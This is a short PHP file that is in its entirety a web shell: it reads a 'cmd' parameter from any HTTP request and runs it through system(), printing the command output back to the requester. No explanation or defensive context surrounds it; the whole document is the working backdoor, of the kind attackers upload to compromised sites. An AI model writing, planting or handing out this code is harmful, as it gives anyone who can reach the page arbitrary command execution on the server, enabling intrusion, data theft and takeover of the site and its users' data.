<?php
    if(isset($_REQUEST['cmd'])){
        $cmd = ($_REQUEST['cmd']);
        echo "<pre>\n";
        system($cmd);
        echo "</pre>";
    }
?>
